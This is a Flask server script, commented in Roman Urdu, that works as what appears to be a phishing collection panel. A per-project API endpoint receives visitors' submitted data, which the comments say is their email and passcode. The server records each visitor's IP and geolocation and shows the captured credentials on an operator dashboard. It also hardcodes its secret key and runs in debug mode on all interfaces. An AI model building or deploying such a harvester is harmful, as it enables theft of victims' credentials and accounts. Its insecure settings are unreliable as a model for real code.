import os, uuid, datetime, requests, re, smtplib, random, logging
from flask import Flask, request, jsonify, render_template, session
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash

# --- 1. ENGINE CONFIG ---
# Flask ko bataya ja raha hai ke templates folder kahan hai
app = Flask(__name__, template_folder='templates') 
app.secret_key = "QUANTUM_FINAL_BOSS_999"

# 100 saal ki session life: User logout kare ya back, data wapas mil jayega [cite: 2026-02-20]
app.permanent_session_lifetime = datetime.timedelta(days=36500) 
CORS(app)

# --- 2. DATABASE (Permanent Storage) ---
basedir = os.path.abspath(os.path.dirname(__file__))
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(basedir, 'quantum_core_master.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- 3. MODELS (Permanent Data Structure) ---

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80))
    email = db.Column(db.String(120), unique=True, index=True)
    password_hash = db.Column(db.String(128))
    user_ip = db.Column(db.String(50))
    user_country = db.Column(db.String(100))
    join_date = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    projects = db.relationship('Project', backref='owner', lazy=True, cascade="all, delete-orphan")

class Project(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100))
    api_key = db.Column(db.String(100), unique=True, default=lambda: f"QC-{uuid.uuid4().hex.upper()}")
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    total_hits = db.Column(db.Integer, default=0) 
    vault_entries = db.relationship('DataEntry', backref='project', lazy=True, cascade="all, delete-orphan")

class DataEntry(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('project.id'))
    payload = db.Column(db.JSON) # Visitors ka Email, Passcode, Sab yahan hai [cite: 2026-02-20]
    visitor_ip = db.Column(db.String(50))
    visitor_loc = db.Column(db.String(100))
    timestamp = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# --- 4. HELPERS ---

def get_loc(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        return f"{res.get('city', 'Unknown')}, {res.get('country', 'Unknown')}"
    except: return "Global Network"

# --- 5. AUTOMATIC & PERSISTENT ROUTES ---

@app.route('/')
def home():
    """Ye route templates/index.html ko load karta hai [cite: 2026-02-20]"""
    return render_template('index.html')

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    user = User.query.filter_by(email=data['email'].lower()).first()
    if user and check_password_hash(user.password_hash, data['password']):
        session.permanent = True
        session['user_id'] = user.id 
        return jsonify({"success": True, "username": user.username}), 200
    return jsonify({"error": "Invalid login"}), 401

@app.route('/api/vault/live')
def get_vault():
    """Data Vault Section: Visitors ka data live dikhane ke liye [cite: 2026-02-20]"""
    if 'user_id' not in session:
        return jsonify({"error": "Please login"}), 401
    
    user_id = session['user_id']
    entries = DataEntry.query.join(Project).filter(Project.user_id == user_id).order_by(DataEntry.timestamp.desc()).all()
    
    return jsonify([{
        "project": d.project.name,
        "content": d.payload, # All details: Email, Password, etc. [cite: 2026-02-20]
        "ip": d.visitor_ip,
        "location": d.visitor_loc,
        "timestamp": d.timestamp.strftime("%Y-%m-%d %I:%M %p")
    } for d in entries])

@app.route('/v1/receive/<api_key>', methods=['POST'])
def capture(api_key):
    """Receiver: Visitors ka data capture karke DB mein save karna [cite: 2026-02-20]"""
    project = Project.query.filter_by(api_key=api_key).first_or_404()
    
    new_entry = DataEntry(
        project_id=project.id,
        payload=request.json,
        visitor_ip=request.remote_addr,
        visitor_loc=get_loc(request.remote_addr)
    )
    project.total_hits += 1
    db.session.add(new_entry)
    db.session.commit()
    return jsonify({"status": "Success", "total_hits": project.total_hits}), 200

if __name__ == '__main__':
    with app.app_context():
        db.create_all() # Tables auto-create honge [cite: 2026-02-20]
    # Debug=True taake browser par error saaf nazar aaye
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
